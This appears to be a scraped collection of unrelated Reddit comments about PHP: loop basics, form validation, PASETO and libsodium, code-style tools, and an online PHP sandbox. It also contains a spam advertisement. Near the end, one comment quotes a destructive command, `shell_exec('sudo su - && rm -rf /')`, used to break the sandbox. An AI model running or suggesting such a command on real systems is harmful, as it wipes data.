Also, we haven't had instructions of how to use the 'while()' variable. The .PDF we're suppose to follow for instructions and guidelines doesn't mention the 'while()' variable either. That's why I'm here. 
Said issues were (/ are?) all visible through the website linked ;-)
Why not search up on ‚ÄúPHP while loop‚Äù in google and read some examples and try it out.
I feel like contributing to the subreddit would be a better way of creating a conversation about the subject. But I'll do a Google search while (hopefully) more will reply. Thank you for answering.
While isn‚Äôt a variable, it‚Äôs a looping keyword $f = 0; while($f &lt; 101) { print($f); $f++; } Would print out 0 through 100 The loop will execute while the test is true, replace the print statement with what you want to do and the condition inside the while with how you want to figure out if you should still be looping http://php.net/manual/en/control-structures.while.php
Ah, a hacker's playpen. Good call `:-)` 
I'll delete my initial post in 5 minuttes. Thank you for your replies.
Thank you for the reply. That made it clear of what the case was asking me for.
I know the problem. I needed to learn this as well for my study 3 months ago and i can't tell you how much time i created never ending loops. In the end i learned it by searching examples on Google And Just trying stuff.
&gt;I need php because i only need it to display the background color if the field is empty. It is part of my validation on the php side. You realize this approach forces you to: 1. allow incomplete submissions (that will hit your form action aka email / database). 1. complicate your form action logic to handle bad submissions properly. 1. forces a page refresh to display your validation. You probably want: 1. On page load - use default form style. 2. Before submission, if field empty or not correct format (email) - show an error style. Don't recreate the wheel. Don't output your form with PHP. Validate client side. ---- Here's a CSS only example, using the 'required' attribute + input:novalid css selector - https://codepen.io/anon/pen/KQLdWx Here's a super basic jquery example (stop before submit - show error style) - http://jsfiddle.net/16fuhf6r/14/ Here's a not-as easy JS example using bootstrap - https://getbootstrap.com/docs/4.0/components/forms/#custom-styles 
Not really, I feel it's pretty bloated laravel app and a bit outdated. One app on my app idea list is create something similar using apis and Vue as a mostly spa. Then it'll be easy to open up apis and create a mobile app around it.
JavaScript isn't my strong suit, but try adding a preventDefault(); call to yyour even handler to prevent the form from submitting as it normally would.
It feels dirty to use JavaScript in this way.
well not exactly what you're seeking but if you just put several input type="submit" buttons into the form, give all of them the same name and different values you get this via $_POST after the request so you submit the form always to a bridge.php and in there (very simplified) switch($_POST['submitbutton']){ case 'Total Households': require './Total_Surveyed.php'; break; case 'Average Household Income': require './Avg_Income.php'; break; } 
Thanks! This works great.
Although, there is one issue. Avg_Income.php displays a js alert box. So it runs that, but then the page loads Bridge.php, which shows as a blank page on the browse. Any workaround for that?
I don't know enough of the structure of your application. Of course the browser thinks it's loading a bridge.php if you want a real redirect you can change to switch(){ case '': header('Location: Total_Surveyed.php'); die(); case '': header('Location: Avg_Income.php'); die(); . . 
&gt; v1 gives you RSASSA-PSS and AES-CTR+HMAC-SHA2 What are you using for your key lengths? 4096-bit RSA, 256-bit AES? For SHA2, are you doing SHA512 or something?
Link w/ Protocol Details: https://github.com/paragonie/paseto/tree/master/docs/01-Protocol-Versions#version-1-compatibility-mode
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [paragonie/paseto/.../**01-Protocol-Versions#version-1-compatibility-mode** (master ‚Üí 785723a)](https://github.com/paragonie/paseto/tree/785723a02bc27e0e90821b0852d9e86573bbe63d/docs/01-Protocol-Versions#version-1-compatibility-mode) ---- 
Use libsodium. It's part of the core in PHP 7.2, and there is a compatibility package for older versions of PHP.
My errors: Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 39 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 45 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 51 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 63 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 69 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 75 Warning: Use of undefined constant intSum - assumed 'intSum' (this will throw an Error in a future version of PHP) in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 81 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 39 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 45 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 51 Notice: Undefined index: saCounty[1] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 57 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 63 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 69 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 75 Warning: Use of undefined constant intSum - assumed 'intSum' (this will throw an Error in a future version of PHP) in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 81 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 39 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 45 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 51 Notice: Undefined index: saCounty[2] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 57 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 63 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 69 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 75 Warning: Use of undefined constant intSum - assumed 'intSum' (this will throw an Error in a future version of PHP) in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 81 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 39 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 45 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 51 Notice: Undefined index: saCounty[3] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 57 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 63 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 69 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 75 Warning: Use of undefined constant intSum - assumed 'intSum' (this will throw an Error in a future version of PHP) in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 81 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 39 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 45 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 51 Notice: Undefined index: saCounty[4] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 57 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 63 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 69 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 75 Warning: Use of undefined constant intSum - assumed 'intSum' (this will throw an Error in a future version of PHP) in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 81 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 39 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 45 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 51 Notice: Undefined index: saCounty[5] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 57 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 63 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 69 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 75 Warning: Use of undefined constant intSum - assumed 'intSum' (this will throw an Error in a future version of PHP) in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 81 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 39 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 45 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 51 Notice: Undefined index: saCounty[6] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 57 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 63 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 69 Notice: Undefined index: saCounty[.$x.] in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 75 Warning: Use of undefined constant intSum - assumed 'intSum' (this will throw an Error in a future version of PHP) in C:\xampp\htdocs\PHP_Site\Content\Week 6\Avg_Income.php on line 81
PHP that collects and stores the data that I am trying to work with in OP. &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;!-- Name: James Hail Class: 140-400 PHP &amp; MySQL Abstract: Player Process Part 2 --&gt; &lt;title&gt;Home Census&lt;/title&gt; &lt;link href="../../Styles/Project_Part_1.css" rel="stylesheet" /&gt; &lt;/head&gt; &lt;body&gt; &lt;script type="text/javascript"&gt; function validateForm(thisform) { with (thisform) { if (validate_Date(dtmSurveyDate, "Date must be entered") == false) { dtmSurveyDate.focus(); return false; } if (validate_County(cboxCounty, "County must be selected") == false) { cboxCounty.focus(); return false; } if (checkIncome(txtIncome, "Yearly income must be numeric and greater than 0.") == false) { txtIncome.focus(); return false; } if (checkSize(txtHouseholdSize, "Household size must be numeric and greater than 0.") == false) { txtHouseholdSize.focus(); return false; } } } function validate_Date(field, alerttext) { with(field) { if (value == "") { alert(alerttext); return false; } } } function validate_County(field, alerttext) { with(field) { if (value == "") { alert(alerttext); return false; } } } function checkIncome(field, alerttext) { with(field) { if (value &gt; 0 &amp;&amp; isNaN(value) == false) { return true; } else { alert(alerttext); return false; } } } function checkSize(field, alerttext) { with(field) { if (value &gt; 0 &amp;&amp; isNaN(value) == false) { return true; } else { alert(alerttext); return false; } } } &lt;/script&gt; &lt;form name="myForm" Action="Bridge.php" method="post"&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;Date: &lt;/td&gt; &lt;td&gt;&lt;input type="datetime-local" id="dtmSurveyDate"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;State &amp; County:&lt;/td&gt; &lt;td align="Center"&gt; &lt;select name="cboxCounty"&gt; &lt;option value=""&gt;Select a County&lt;/option&gt; &lt;option value="Hamilton, OH"&gt;Hamilton, OH&lt;/option&gt; &lt;option value="Butler, OH"&gt;Butler, OH&lt;/option&gt; &lt;option value="Clermont, OH"&gt;Clermont, OH&lt;/option&gt; &lt;option value="Warren, OH"&gt;Warren, OH&lt;/option&gt; &lt;option value="Campbell, KY"&gt;Campbell, KY&lt;/option&gt; &lt;option value="Boone, KY"&gt;Boone, KY&lt;/option&gt; &lt;option value="Kenton, KY"&gt;Kenton, KY&lt;/option&gt; &lt;/select&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Household Size:&lt;/td&gt; &lt;td&gt; &lt;input type="text" name="txtHouseholdSize"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Yearly Income:&lt;/td&gt; &lt;td&gt; &lt;input type="text" name="txtIncome"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td align="center" colspan=2&gt; &lt;input type="submit" name="Submit" Value="Submit Data")"&gt; &lt;input type="reset"&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td align="center" colspan=2&gt; &lt;input type="submit" name="Submit" value="Total Households Surveyed"&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td align="center" colspan=2&gt; &lt;input type="submit" name="Submit" value="Average Household Income"&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td align="center" colspan=2&gt; &lt;input type="submit" name="Submit" value="Percentage Below Poverty"&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 
htm file: &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;title&gt;Home Census&lt;/title&gt; &lt;link href="../../Styles/Project_Part_1.css" rel="stylesheet" /&gt; &lt;/head&gt; &lt;body&gt; &lt;script type="text/javascript"&gt; function validateForm(thisform) { with (thisform) { if (validate_Date(dtmSurveyDate, "Date must be entered") == false) { dtmSurveyDate.focus(); return false; } if (validate_County(cboxCounty, "County must be selected") == false) { cboxCounty.focus(); return false; } if (checkIncome(txtIncome, "Yearly income must be numeric and greater than 0.") == false) { txtIncome.focus(); return false; } if (checkSize(txtHouseholdSize, "Household size must be numeric and greater than 0.") == false) { txtHouseholdSize.focus(); return false; } } } function validate_Date(field, alerttext) { with(field) { if (value == "") { alert(alerttext); return false; } } } function validate_County(field, alerttext) { with(field) { if (value == "") { alert(alerttext); return false; } } } function checkIncome(field, alerttext) { with(field) { if (value &gt; 0 &amp;&amp; isNaN(value) == false) { return true; } else { alert(alerttext); return false; } } } function checkSize(field, alerttext) { with(field) { if (value &gt; 0 &amp;&amp; isNaN(value) == false) { return true; } else { alert(alerttext); return false; } } } &lt;/script&gt; &lt;form name="myForm" Action="Bridge.php" method="post"&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;Date: &lt;/td&gt; &lt;td&gt;&lt;input type="datetime-local" id="dtmSurveyDate"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;State &amp; County:&lt;/td&gt; &lt;td align="Center"&gt; &lt;select name="cboxCounty"&gt; &lt;option value=""&gt;Select a County&lt;/option&gt; &lt;option value="Hamilton, OH"&gt;Hamilton, OH&lt;/option&gt; &lt;option value="Butler, OH"&gt;Butler, OH&lt;/option&gt; &lt;option value="Clermont, OH"&gt;Clermont, OH&lt;/option&gt; &lt;option value="Warren, OH"&gt;Warren, OH&lt;/option&gt; &lt;option value="Campbell, KY"&gt;Campbell, KY&lt;/option&gt; &lt;option value="Boone, KY"&gt;Boone, KY&lt;/option&gt; &lt;option value="Kenton, KY"&gt;Kenton, KY&lt;/option&gt; &lt;/select&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Household Size:&lt;/td&gt; &lt;td&gt; &lt;input type="text" name="txtHouseholdSize"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Yearly Income:&lt;/td&gt; &lt;td&gt; &lt;input type="text" name="txtIncome"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td align="center" colspan=2&gt; &lt;input type="submit" name="Submit" Value="Submit Data")"&gt; &lt;input type="reset"&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td align="center" colspan=2&gt; &lt;input type="submit" name="Submit" value="Total Households Surveyed"&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td align="center" colspan=2&gt; &lt;input type="submit" name="Submit" value="Average Household Income"&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td align="center" colspan=2&gt; &lt;input type="submit" name="Submit" value="Percentage Below Poverty"&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 
Two things that will help this become popular would be a good website like https://jwt.io and then libraries in popular languages (PHP, Node, Golang etc). 
I have the .io domain for Paseto, but I'm not good enough at web design to make anything presentable out of it just yet.
lol this post is right beside the post that points out why JWT is bad
ended up using libsodium and prepending the nonce to the encrypted data and base64 encoding it
I think the more and more frameworks for JS that come out for the back end, the line gets more and more blurred.
Depends on whether you are distributing code, using a testing framework, writing a framework, etc and need constructors and such. Most of the time I ignore all the college theorizing, class wrapping obsessives, and global demonization and use the simplest model. Just create a global class used for global and put any shared data in there at the start of the program. Then use the global keyword (or $_GLOBALS) in functions to access the class. That's what it's for. Pass the variable data need to customize particular calls to the functions as parameters. Fixed data like API keys, fixed time, credentials, defaults can be stored in the global class or subclasses of it. // short name = less typing $myg = new StdClass; // example fixed time/date variables $myg-&gt;nowdt = datetime(); $myg-&gt;ymd = date("Ymd"); $myg-&gt;utime = time(); function whatever() { // single line accesses all the globals global $myg; echo $myg-&gt;utime ."\n"; } 
&gt; Wordpress is still here And running more websites than just about anything else. There's opportunity in that too.
PHPFiddle!
Nice
Yep. That‚Äôs what we're probably going to do as the migration path while we clean our code up
Came here to suggest Brad Traversy. Good conversational style. No messing around. Solid practice, no fluff. https://www.youtube.com/user/TechGuyWeb
Eh, why not learn both? Node uses a different paradigm, from which a php programmer can learn a lot. Also php has more mature frameworks.
Would be awesome to include more frameworks.
Whats your usecase for encrypting data in the database?
Even with Bootstrap, every time I do anything in the vicinity of frontend work, all it does is make people complain loudly and (to my frustration) vaguely. I've given up on making anything presentable. I'll probably hire a freelancer to put together a pretty page in the future.
I'm also not really good at web designing, but I'm happy to help (free of course) if you want. For reference, I've created the PHPToday website myself. I can do better if you have a sample design :)
https://stackoverflow.com/questions/3620659/is-it-possible-to-overwrite-a-function-in-php or just make your own MyCount function, and just rename every count to that one, where you fix it at one place, until the real bug is fixed. This will cost you perhaps half an hour...
I appreciate the gesture, but just so everyone knows, I'm going to be very staunch about this: If someone is going to work with me on any project at my behest, *they are going to get paid for their time*.
This is an aaaaancient infographic - it just shows the perf changes for the new PHP engine, not the underlying tools.
Wow, such a hot news! I am excited to see it today, 5th March, *2016*
Why oh why do we need to waste 10 bytes on version designator. Mobile traffic is still expensive and this adds up quickly.
:D Hey. Author asked about input for feasibility of his idea. Right? RIGHT? ;)
That's really great! In that case I will leave it for someone who is better than me :)
ah gerat point! read about paseto somewhere before....and will probably migrate
By the way, what's the point in being a karma whore? What gives if you spam random subs with seemingly relevant links? What all the collected karma is good for?
for php 7 and laravel 5 only, such elitism :-)
[already a thing](http://phpfiddle.org/)
It supports PHP 5.4 up to PHP 7.2.
*now* it supports other versions of PHP as they were just added :-) 
Sounds like https://github.com/FriendsOfPHP/PHP-CS-Fixer would partially cover your needs (with flags --rules=@PSR2 or --rules=@Symfony). If you define the clearer context (e.g. you need it for CI or probably only to integrate into your favorite IDE/Editor), it'll be probably more hints.
&gt; This will cost you perhaps half an hour... we have 11264 instances of potentially bad usages of `count()`. If you can do this in half an hour, that's amazing. For me, it would take considerably longer. And it would turn what can be done in a simple engine opcode into a userspace function call which would for sure affect performance (though the cost of counting probably is much higher than the cost of calling count() anyways)
Is it worth adding an Impressum or page of authorship, for curious folks? 
I was trying some stuff and I think I broke it. ``` 2closedir() expects parameter 1 to be resource, null given/usr/local/app/frameworks/laravel/5.6/vendor/symfony/finder/Iterator/RecursiveDirectoryIterator.php131 ``` Let me know if need info about the issue.
this is freaking awesome!!! db stuff in particular
it's phpfiddle not phpiddle
PHP is as of now positioned as the most looked for after aptitude in JOB Market.More than 30% of the sites assembled online are created with php training kolkata. In this manner making it as the most utilized scripting dialect. For a lot of individuals the information of PHP has turned into a wellspring of their pay. There are a considerable measure of PHP wannabes and understudies willing to set up their profession in PHP.There are a ton of php mysql training institute in kolkata, however none of them appears to give finish information of the subject. In the present aggressive world, we need to dependably be up and coming on the off chance that we are a web engineer. The most concerning issue that the majority of the fresher's with information of PHP and my sql confront is absence of certainty and in this manner turning out in work dismissals. More Info : http://multitechnosys.com
There's a market for old(ish) reddit accounts with established post/comment histories. Such accounts can then be used to shill certain viewpoints en-mass without the obvious giveaway of "this account was created just to post this message".
Ah I see now. Thank you. That's a dark side of Reddit
Don't forget /u/nikic's work on that topic.
Will this have any significant impact on runtime performance?
 &gt; when passed a Doctrine result to PHPexcel I choked on my lunch &gt;_&lt;
Should have changed to arrayResult but at the time I didn't know how to do it
Yes, automatically. I meant that most PHP scripts never hit the threshold when it's fired. But once they do, there will be a benefit for sure
Now? Because before PHP7 there was nothing to port to. Interpreter was not even working on structure of code, so all behavious where tighly coupled to specific php syntax. Now there is AST, and interpreting passes work on it. Do now, maybe it's good enough to support any other language. But then there would doll be friction of different goals and even design philosophies, so how much code would end up being shared is up to debate. Also. Facebook seam totally happy moving Hack into it's own future separate totally from PHP lang.
Hey all, just took over a position as a web developer where the previous web dev didn't do much upgrading of the old versions of well, anything. One of our servers is using PHP 4.3.8. How do I upgrade to a newer version now? Should I step up versions a little at a time? 
Nicolas gave his POV in another issue in the `symfony/skeleton` package: https://github.com/symfony/skeleton/issues/50 What's your opinion?
I've been playing with PhpCs recently, and the docs can definitely be improved. I'd be willing to contribute to it, though. Maybe some coordinated effort?
If other folks think eslint's is a good model, we could start out with looking into how we might be able to fork it from them, drop it in a repo somewhere, and start building out issues for all the things people can spot that would need work to adopt. Maybe in the course of that forking eslint's docs will start to look like a bad idea, and maybe documenting phpcs instead of forking/rebooting will too, but at least at that point it will be made concrete exactly what needs to be done differently
imho, there is probably a good case to be made to re-write that tool to use some of the abstract syntax tree parsers, rather than the more antiquated tokenizers. That _should_ make writing 'sniffs' or rules to be significantly easier than the way it had to be implemented before we had those tools.
Yes that looks pretty good. For me it's not only about the descriptions, it's about knowing what actually exists. AFAIK there is not even a list of all the sniffs included with PHPCS.
That's a great point, ASTs are what make eslint so conducive to reconfiguring and extending
I get errors when trying to use 5.4. It does execute but then I get a few "Warning: file_put_contents() has been disabled for security reasons in /usr/local/app/implode.io/resources/stubs/bootstrap.php on line 28". 
&gt; I've never seen manual GC used in the wild tbh. I'm using it in a long-ass batch processing working days with doctrine entities, as it would be wastefull to run it at any other moment than just after mass-detach
-1 for php-cs-fixer. Sometimes dry-run doesn't show things it will actually do during fix. Immediate composer remove.
Or use an iterator with https://github.com/box/spout if it has enough features for you
Get whatever system you're interoperating with to support Paseto too.
Using ASTs alone will not preserve certain aspects of the code, such as whitespace to group certain parts of the code, or placement of comments on a line. For some people this is too restrictive; for others this is ideal.
Not sure what do you mean. Can you share a link to a bug-ticket maybe? 
I wish I could support it (Although I disagree with you on the pitfalls of JOSE), but I'm limited by Java's Windows Keystore provider, so this list: https://docs.oracle.com/javase/8/docs/technotes/guides/security/StandardNames.html#Signature
Depending on the details - I would set up a VM with PHP7+ and put the code on it. Just see what happens. Depending on how it was coded it could present zero problems. On the other hand - it could cause a small black hole and devour your office. A quick glance looks like this might be a good resource: https://auth0.com/blog/migrating-a-php5-app-to-7-part-three/
For encryption, yes. But not for signature.
`shell_exec('sudo su - &amp;&amp; rm -rf /');` seemed to do a number on it...
Hmm, the more I look at Java the more I recoil in horror. Even Java 9 doesn't have consistent PSS support from this API. Might I recommend libsodium instead?
The funniest part is that the timing was purely coincidental. I drafted this post a week ago but then got sidelined by work responsibilities and then some enhancements to the PHP implementation from Aidan Woods.
Whoopsie.
Oh, I thought the white space 'layout' was preserved, or at least code be retrieved from the AST.
I don't have exact numbers, but from data we are collecting from hundreds of applications of our customers, the GC almost never triggers in web requests (way below 1%) and when it does it usually doesn't take longer than a few ms in seconds long requests. What will benefit massively will be CLI scripts (cronjobs, commands etc.) which are running for longer times and using PHP resources massively.
Personally I don't like customizing analysis tools, because I think that it kind of defeats the purpose. With that said, though, there are a couple rules that I really disagree with. I shouldn't get a warning if I name a variable `$id`, because it's only 2 letters long. I shouldn't get a warning because I'm using a boolean parameter and it thinks I'm violating the SRP (I'm often dealing with value objects, come on). I shouldn't get a warning for using a static method. The thing is, I often end up just ignoring the rules because they are randomly strict where it doesn't really make sense. And customizing them and providing a shared, sensible preset is just so annoying.
isn‚Äôt it inside docker?
do you also always comment without informing yourself?
`GC_PURPLE`
libsodium does not support hardware keys, so I can't use it. I'm really stuck in a corner here : /
Can you install Bouncy Castle? If so, you can use PSS signatures, and therefore Paseto.
Again, bouncy castle does not support hardware keys, so I'm back in my corner.
This sounds really weird. What exactly are you doing with JWT to communicate with web apps where the key itself must be a hardware key?
I work automating and optimizing business processes and most of the time I use PHP, but this is not the case all the time as different processes require different solutions. After some research I opted to go with a job scheduler and orchestration software: [Rundeck](http://rundeck.org/) and I haven't looked back. You can use it to run scripts in many languages, you can set workflows, execute remote tasks in other server, break jobs down into different steps, handle errors, hooking to third party clients like slack... So check it out it could be good for you too. 
I use https://github.com/Symplify/EasyCodingStandard It allows you to use **both** PHPCS and PHP-CS-Fixer. So in practice, most of my rules are coming from PHP-CS-Fixer, since in my experience it's less sloppy, more reliable and has better documentation, but few rules I like from PHPCS are not in PHP-CS-Fixer and this allows me to use them.
Ah thank you! 
&gt; Phew, not good. I wonder why WP seem to be doing their own param binding rather than getting PDO or MySQLi to do it? Right!?... like "what, why?" 
&gt; Or, heck, even a tool to help generate finely tuned phpcs.xml definitions? http://edorian.github.io/php-coding-standard-generator/ 
You could say, it imploded.
+1 for comment on symfony
Thank you! I'll do by best to make instant upgrades as simple as "composer update"
**Why choose, when you can use them all (both)?** Thanks to [EasyCodingStandard](https://github.com/Symplify/EasyCodingStandard), it's really easy. [Shopsys](https://github.com/shopsys/coding-standards), [Nette](https://github.com/nette/coding-standard) and [Sylius](https://github.com/SyliusLabs/CodingStandard) are already using it. Links lead to repository with rule sets, that are used by these packages. Their travis.yml can be simple how-to manual. 1. Install: composer require symplify\easy-coding-standard --dev 2. Configure: # easy-coding-standard.neon checkers: PhpCsFixer\Fixer\ArrayNotation\ArraySyntaxFixer: syntax: short 3. And from CLI: # run vendor/bin/ecs check src # fix vendor/bin/ecs check src --fix Do you want to read more about it? Just [follow this post](https://www.tomasvotruba.cz/blog/2017/05/03/combine-power-of-php-code-sniffer-and-php-cs-fixer-in-3-lines)
I'm the maintainer of PHPCS, but wanted to say that documentation is the main area of the tool that I've never been able to get time to focus on. There is only one of me, and even with the help of some really great contributors, the flood of requests is really overwhelming. I have very limited time to work on PHPCS and the priority is always to fix issues that people find rather than being able to sit down and write proper documentation. Ironically, one part of my day job is to write clear technical documentation for APIs, but I just can't find the time to do that for PHPCS. It's something that is always sitting on my todo list and it's something that would be a huge benefit to the project. So I just wanted to say that I am listening even though I can't always reply, and this is something I've specially tried to get off the ground several times. If I can get a break from the constant stream of github issues, I'd love to get a proper PHPCS documentation site off the ground and finally list out all the message codes. If anyone would like to help out, contact me through github and we could start by going through and compiling a list of the error codes and messages directly from the sniffs and putting it in the wiki. It's not great documentation, but it would be a start.
at least this one doesn't run shell functions :)
The problem with this is that it would be a huge BC break for all the custom sniffs out there. I did look into using the built-in AST when it went into beta, but the fact it didn't preserve whitespace was a deal-breaker given a lot of coding standards revolve around formatting and layout of code. Instead, I did a lot of core refactoring in the 3.0 version, which still broke compatibility with custom sniffs, but not too badly (just some namespaces being added mostly). Even so, there are a large number of projects who have not been able to move away from version 2 even 18 months on, so you can imagine how long it would take those projects to upgrade if they had to do a complete rewrite.
You might like [Rector](https://github.com/rectorphp/rector) that does exactly the same thing for Symfony, PHPUnit, PHP-Parser, Twig, Nette, Sensio and few more. I've recently posted 3 intro posts about Rector: - [Rector: Part 1 - What and How](https://www.tomasvotruba.cz/blog/2018/02/19/rector-part-1-what-and-how/) - [Part 2 - Maturity of PHP Ecosystem and Founding Fathers](https://www.tomasvotruba.cz/blog/2018/02/26/rector-part-2-maturity-of-php-ecocystem-and-founding-fathers/) - [Part 3 - Why Instant Upgrades](https://www.tomasvotruba.cz/blog/2018/03/05/rector-part-3-why-instant-upgrades/)
This went a bit over my head, anyone care to explain?
I‚Äôm a bit confused? So you built the site initially just in slim and then added Wordpress as a back end? Wouldn‚Äôt it of been easier just to redo the site in Wordpress? I mean after all you had the html and css and Wordpress is essentially copying and pasting functions? 
In my experience, some operating system versions shipped with PHP defaults that would ineffectively and somewhat inexplicably fire GC, causing a fatal every few thousand requests. (Pretty sure ubuntu 10.04 did this)
That sounds great, I'll definitely have a look at it, thanks for sharing.
Yeah like 0 professional Rails devs use Windows.
http://php.net/manual/en/language.types.object.php and if you're really brave https://github.com/php/php-src. Yes they are bit more ad-hoc compared to a language like Java. But PHP has always been a bit more laissez-faire. Just look at how variables can be declared. Sure we are getting the ability to be stricter, but nothing is there to force a developer to be strict. With that said, they are not associative arrays. They have methods and can define public, private, and protected member variables and methods. They can be extended, they can inherit, and they can implement. You can do factories with them, singletons, and whatever else you want including insert ad-hoc member variables and iterate over them.
